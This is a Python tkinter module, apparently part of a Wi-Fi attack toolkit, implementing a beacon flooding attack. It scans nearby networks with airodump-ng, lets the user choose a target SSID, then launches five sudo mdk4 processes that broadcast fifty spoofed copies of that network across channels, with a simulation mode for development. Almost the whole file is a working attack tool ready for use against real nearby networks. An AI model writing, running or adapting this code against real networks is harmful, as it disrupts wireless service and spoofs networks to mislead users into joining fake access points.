import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import threading
import os
import time
import tempfile
import random
import re

# Change to relative import for better module resolution
from .utils import DARK_BG, PANEL_BG, TEXT_COLOR, ACCENT_GOLD, HoverButton, WARNING_COLOR

class BeaconFloodingAttack:
    def __init__(self, root=None, return_callback=None):
        self.root = root
        self.return_callback = return_callback
        
        # Attack state
        self.scanning = False
        self.attacking = False
        self.attack_processes = []
        self.selected_network = None
        
        # For simulation on non-Linux systems
        self.is_simulating = os.name != 'posix'
        self.simulation_networks = [
            "WiFi_Network_1", 
            "HomeRouter123", 
            "PublicWiFi", 
            "CoffeeShop_Free", 
            "GuestNetwork", 
            "IoT_Network",
            "AndroidAP",
            "iPhone_Hotspot",
            "Corporate_5G",
            "Neighbors_WiFi"
        ]
        
    def setup_ui(self, parent_frame):
        """Setup the UI components for Beacon Flooding Attack page."""
        
        # Create scanning button
        self.scan_btn = HoverButton(
            parent_frame, 
            text="Scan Networks", 
            font=("Arial", 14, "bold"),
            bg=PANEL_BG, 
            fg=ACCENT_GOLD, 
            bd=0, 
            padx=20, 
            pady=15,
            command=self.start_scan
        )
        self.scan_btn.place(x=20, y=20, width=190, height=60)
        
        # Create choose button
        self.choose_btn = HoverButton(
            parent_frame, 
            text="Choose", 
            font=("Arial", 14, "bold"),
            bg=PANEL_BG, 
            fg=ACCENT_GOLD, 
            bd=0, 
            padx=20, 
            pady=15,
            state=tk.DISABLED,
            command=self.choose_network
        )
        self.choose_btn.place(x=230, y=20, width=190, height=60)
        
        # Status message
        self.status_label = tk.Label(
            parent_frame, 
            text="Click Scan to find nearby networks", 
            font=("Arial", 12),
            bg=PANEL_BG, 
            fg=TEXT_COLOR,
            wraplength=380  # Add wraplength to ensure text fits
        )
        self.status_label.place(x=20, y=90, width=400, height=30)
        
        # Network selection section
        selection_frame = tk.Frame(parent_frame, bg=PANEL_BG)
        selection_frame.place(x=10, y=125, width=420, height=300)
        
        # Label for network list
        self.network_label = tk.Label(
            selection_frame, 
            text="Available Networks:", 
            font=("Arial", 14, "bold"),
            bg=PANEL_BG, 
            fg=ACCENT_GOLD, 
            anchor="w"
        )
        self.network_label.pack(side=tk.TOP, fill=tk.X, padx=15, pady=(10, 5))
        
        # Create a frame for the listbox with scrollbar
        list_frame = tk.Frame(selection_frame, bg=PANEL_BG)
        list_frame.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=15, pady=5)
        
        # Scrollbar
        scrollbar = tk.Scrollbar(list_frame, width=20)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Networks listbox
        self.network_listbox = tk.Listbox(
            list_frame,
            bg="#2A2A2A",
            fg=TEXT_COLOR,
            selectbackground=ACCENT_GOLD,
            selectforeground="#000000",
            font=("Arial", 12),
            bd=0,
            highlightthickness=0,
            activestyle="none"
        )
        self.network_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Configure the scrollbar
        scrollbar.config(command=self.network_listbox.yview)
        self.network_listbox.config(yscrollcommand=scrollbar.set)
        
        # Attack button
        self.attack_btn = HoverButton(
            parent_frame,
            text="Start Flooding",
            font=("Arial", 16, "bold"),
            bg=PANEL_BG,
            fg=ACCENT_GOLD,
            bd=0,
            padx=20,
            pady=15,
            state=tk.DISABLED,
            command=self.start_attack
        )
        self.attack_btn.place(x=20, y=435, width=400, height=60)
        
        # Bind selection event
        self.network_listbox.bind("<<ListboxSelect>>", self.on_selection)
        
        # Add development mode indicator if simulating
        if self.is_simulating:
            dev_label = tk.Label(
                parent_frame,
                text="DEVELOPMENT MODE - SIMULATION ACTIVE",
                font=("Arial", 10),
                bg=PANEL_BG,
                fg=WARNING_COLOR
            )
            dev_label.place(x=20, y=500, width=400)
        
    def start_scan(self):
        """Start scanning for networks"""
        if self.scanning:
            return
            
        self.scanning = True
        self.scan_btn.config(state=tk.DISABLED)
        self.network_listbox.delete(0, tk.END)
        self.status_label.config(text="Scanning for networks...")
        self.network_label.config(text="Available Networks:")
        
        # Reset selection
        self.selected_network = None
        self.choose_btn.config(state=tk.DISABLED)
        self.attack_btn.config(state=tk.DISABLED)
        
        # Start scan in background thread
        threading.Thread(target=self.run_scan, daemon=True).start()
    
    def run_scan(self):
        """Run the network scan"""
        try:
            # For simulation mode on non-Linux
            if self.is_simulating:
                self.simulate_scan()
                return
                
            # Check if monitor mode is active (looking for wlan1mon)
            result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
            output = result.stdout
            
            # Check if monitor mode interface exists
            if "wlan1mon" not in output:
                self.root.after(0, lambda: messagebox.showwarning(
                    "Monitor Mode Required", 
                    "Please enable Monitor Mode from the main page before scanning."
                ))
                self.root.after(0, self.handle_scan_error, "Monitor mode not enabled")
                return
            
            # Run airodump-ng to scan for networks
            process = subprocess.Popen(
                ["sudo", "airodump-ng", "wlan1mon", "--output-format", "csv", "-w", "temp_scan"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait for 5 seconds to collect data
            time.sleep(5)
            process.terminate()
            
            # Read the CSV file
            with open("temp_scan-01.csv", "r") as f:
                lines = f.readlines()
            
            # Parse network data
            networks = []
            for line in lines:
                if "," in line and "BSSID" not in line and "Station" not in line:
                    parts = line.strip().split(",")
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        signal = parts[8].strip()
                        ssid = parts[13].strip()
                        if bssid and ssid:
                            networks.append((ssid, bssid, channel, signal))
            
            # Update UI with found networks
            self.root.after(0, self.update_network_list, networks)
            
        except Exception as e:
            self.root.after(0, self.handle_scan_error, str(e))
        finally:
            # Clean up
            try:
                os.remove("temp_scan-01.csv")
            except:
                pass
            self.scanning = False
            self.root.after(0, self.scan_btn.config, {"state": tk.NORMAL})
            
    def simulate_scan(self):
        """Simulate network scanning for development on non-Linux systems"""
        # Pause to simulate scanning activity
        time.sleep(2)
        
        # Randomly select 4-8 networks from the simulation list
        num_networks = random.randint(4, 8)
        network_data = []
        
        # Create simulated network data with BSSID, channel, and signal
        for i in range(num_networks):
            ssid = random.choice(self.simulation_networks)
            bssid = ':'.join([f'{random.randint(0, 255):02X}' for _ in range(6)])
            channel = str(random.randint(1, 11))
            signal = str(random.randint(-90, -30))
            network_data.append((ssid, bssid, channel, signal))
        
        # Update UI with simulated networks
        self.root.after(0, self.update_network_list, network_data)
        self.root.after(0, lambda: self.status_label.config(
            text=f"Found {len(network_data)} networks (SIMULATED)")
        )
        
        # Clean up
        self.scanning = False
        self.root.after(0, self.scan_btn.config, {"state": tk.NORMAL})
            
    def update_network_list(self, networks):
        """Update the network list with found networks"""
        self.network_listbox.delete(0, tk.END)
        for network in networks:
            self.network_listbox.insert(tk.END, f"{network[0]} ({network[1]}) - Ch:{network[2]}")
        self.status_label.config(text=f"Found {len(networks)} networks")
        
    def handle_scan_error(self, error):
        """Handle scan errors"""
        self.status_label.config(text=f"Scan error: {error}")
        self.scanning = False
        self.scan_btn.config(state=tk.NORMAL)
    
    def on_selection(self, event):
        """Handle selection in the list window"""
        selection = self.network_listbox.curselection()
        if not selection:
            return
            
        # If we're in attack mode, don't do anything with the selection
        if self.attacking:
            return
            
        selected_text = self.network_listbox.get(selection[0])
        # Extract network name from the selected text (everything before the parenthesis)
        if "(" in selected_text:
            self.selected_network = selected_text[:selected_text.find("(")].strip()
            self.status_label.config(text=f"Selected network: {self.selected_network}")
            self.choose_btn.config(state=tk.NORMAL)
        
    def choose_network(self):
        """Export the selected network info to a temp file"""
        if not self.selected_network:
            messagebox.showwarning("Selection Required", "Please select a network first")
            return
        
        try:
            # Create a temp file to store the selected network info
            self.network_info_file = tempfile.mktemp(prefix="beacon_target_")
            with open(self.network_info_file, "w") as f:
                f.write(f"SSID: {self.selected_network}\n")
            
            # Update status and enable attack button
            self.status_label.config(text=f"Target selected: {self.selected_network}")
            self.attack_btn.config(state=tk.NORMAL)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save network info: {e}")
            print(f"Error creating temp file: {e}")
    
    def start_attack(self):
        """Start the beacon flooding attack"""
        if not hasattr(self, 'network_info_file') or not os.path.exists(self.network_info_file):
            messagebox.showwarning("Selection Required", "Please choose a network first")
            return
            
        if not self.attacking:
            # Start the attack
            self.attacking = True
            self.attack_btn.config(text="Stop Flooding", command=self.stop_attack)
            self.scan_btn.config(state=tk.DISABLED)
            self.choose_btn.config(state=tk.DISABLED)
            self.network_listbox.config(state=tk.NORMAL)  # Keep it enabled to scroll through results
            
            # Update the network label
            self.network_label.config(text="Flooding Status:")
            
            # Start attack in background thread
            threading.Thread(target=self.run_attack, daemon=True).start()
        else:
            # Stop the attack
            self.stop_attack()
        
    def run_attack(self):
        """Run the beacon flooding attack using multiple mdk4 processes"""
        try:
            # Read the selected network from the temp file
            with open(self.network_info_file, "r") as f:
                for line in f:
                    if line.startswith("SSID:"):
                        ssid = line[5:].strip()
                        break
                else:
                    ssid = self.selected_network
            
            # Clear the listbox to display attack status
            self.root.after(0, self.network_listbox.delete, 0, tk.END)
            self.root.after(0, lambda: self.network_listbox.insert(tk.END, f"Starting beacon flooding with target: {ssid}"))
            self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Creating 50 copies of the target network..."))
            
            # Update UI with status
            self.root.after(0, self.status_label.config, 
                           {"text": f"Flooding with 50 copies of '{ssid}'"})
            
            # Create temporary files with variations for better visibility
            self.temp_file_paths = []
            
            # Create 5 temp files with 10 AP names each
            for group in range(5):
                temp_path = tempfile.mktemp()
                self.temp_file_paths.append(temp_path)
                
                with open(temp_path, "w") as f:
                    for i in range(10):
                        # Add a small, non-visible suffix to ensure uniqueness while maintaining 
                        # visual consistency (most WiFi clients will show the same name)
                        suffix = "" if group == 0 and i == 0 else f"_{group}{i}"
                        f.write(f"{ssid}{suffix}\n")
            
            if self.is_simulating:
                # Simulate attack for development
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "SIMULATION MODE: Attack would run on a real device"))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, ""))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "--- Flooding Details ---"))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, f"Target: {ssid}"))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Method: 5 separate mdk4 processes"))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Process 1: All channels, beacon rate 100/sec"))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Process 2: Channel 1, beacon rate 50/sec"))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Process 3: Channel 6, beacon rate 50/sec"))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Process 4: Channel 11, beacon rate 50/sec"))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Process 5: Channel hopping, beacon rate 80/sec"))
                
                # Start simulated countdown
                self.simulate_attack_progress()
            else:
                # Start 5 separate mdk4 processes with different parameters for better visibility
                self.attack_processes = []
                
                # Process 1: Use all channels with high speed
                process1 = subprocess.Popen(
                    ["sudo", "mdk4", "wlan1mon", "b", "-f", self.temp_file_paths[0], "-a", "-s", "100"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.attack_processes.append(process1)
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Started process 1: All channels, high rate"))
                
                # Add a small delay between process starts
                time.sleep(0.5)
                
                # Process 2: Use channel 1 (common channel)
                process2 = subprocess.Popen(
                    ["sudo", "mdk4", "wlan1mon", "b", "-f", self.temp_file_paths[1], "-c", "1", "-s", "50"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.attack_processes.append(process2)
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Started process 2: Channel 1"))
                
                time.sleep(0.5)
                
                # Process 3: Use channel 6 (common channel)
                process3 = subprocess.Popen(
                    ["sudo", "mdk4", "wlan1mon", "b", "-f", self.temp_file_paths[2], "-c", "6", "-s", "50"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.attack_processes.append(process3)
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Started process 3: Channel 6"))
                
                time.sleep(0.5)
                
                # Process 4: Use channel 11 (common channel)
                process4 = subprocess.Popen(
                    ["sudo", "mdk4", "wlan1mon", "b", "-f", self.temp_file_paths[3], "-c", "11", "-s", "50"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.attack_processes.append(process4)
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Started process 4: Channel 11"))
                
                time.sleep(0.5)
                
                # Process 5: Custom approach with different parameters
                process5 = subprocess.Popen(
                    ["sudo", "mdk4", "wlan1mon", "b", "-f", self.temp_file_paths[4], "-g", "-s", "80"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.attack_processes.append(process5)
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Started process 5: Channel hopping"))
                
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, ""))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Attack running..."))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "50 duplicate networks should be visible now"))
                self.root.after(0, lambda: self.network_listbox.insert(tk.END, "Press 'Stop Flooding' to terminate the attack"))
                
        except Exception as e:
            self.root.after(0, self.handle_attack_error, str(e))
            
    def simulate_attack_progress(self):
        """Simulate attack progress for UI testing in development mode"""
        if not self.attacking:
            return
            
        elapsed_time = 0
        
        def update_time():
            nonlocal elapsed_time
            if not self.attacking:
                return
                
            elapsed_time += 5
            minutes = elapsed_time // 60
            seconds = elapsed_time % 60
            
            time_text = f"Attack running for {minutes:02d}:{seconds:02d}"
            
            found = False
            for i in range(self.network_listbox.size()):
                if "Attack running for" in self.network_listbox.get(i):
                    self.network_listbox.delete(i)
                    self.network_listbox.insert(i, time_text)
                    found = True
                    break
                    
            if not found:
                self.network_listbox.insert(tk.END, "")
                self.network_listbox.insert(tk.END, time_text)
                
            # Schedule next update if still attacking
            if self.attacking:
                self.root.after(5000, update_time)
        
        # Start the timer updates
        self.root.after(5000, update_time)
    
    def stop_attack(self):
        """Stop the beacon flooding attack"""
        self.attacking = False
        self.attack_btn.config(text="Start Flooding", command=self.start_attack)
        self.scan_btn.config(state=tk.NORMAL)
        self.choose_btn.config(state=tk.DISABLED)
        self.network_listbox.config(state=tk.NORMAL)
        self.network_label.config(text="Available Networks:")
        self.status_label.config(text="Flooding stopped")
        
        # Clear the listbox
        self.network_listbox.delete(0, tk.END)
        
        # Stop all attack processes
        if hasattr(self, 'attack_processes') and self.attack_processes:
            for process in self.attack_processes:
                try:
                    process.terminate()
                except:
                    pass
            self.attack_processes = []
            
        # Also try to kill all mdk4 processes
        if not self.is_simulating:
            try:
                subprocess.run(["sudo", "killall", "mdk4"], 
                            stdout=subprocess.DEVNULL, 
                            stderr=subprocess.DEVNULL)
            except:
                pass
        
        # Clean up temporary files
        try:
            if hasattr(self, 'temp_file_paths'):
                for path in self.temp_file_paths:
                    if os.path.exists(path):
                        os.remove(path)
                self.temp_file_paths = []
                
            if hasattr(self, 'network_info_file') and os.path.exists(self.network_info_file):
                os.remove(self.network_info_file)
                delattr(self, 'network_info_file')
        except Exception as e:
            print(f"Error cleaning up temp files: {e}")
        
    def handle_attack_error(self, error):
        """Handle attack errors"""
        self.status_label.config(text=f"Attack error: {error}")
        print(f"Attack error: {error}")
        self.stop_attack()
        
    def __del__(self):
        """Cleanup when object is destroyed"""
        if hasattr(self, 'attacking') and self.attacking:
            self.stop_attack()

# For standalone testing
if __name__ == "__main__":
    root = tk.Tk()
    root.geometry("480x640")
    root.configure(bg=DARK_BG)
    
    frame = tk.Frame(root, bg=PANEL_BG, width=440, height=400)
    frame.pack(pady=100)
    
    attack = BeaconFloodingAttack(root)
    attack.setup_ui(frame)
    
    root.mainloop() 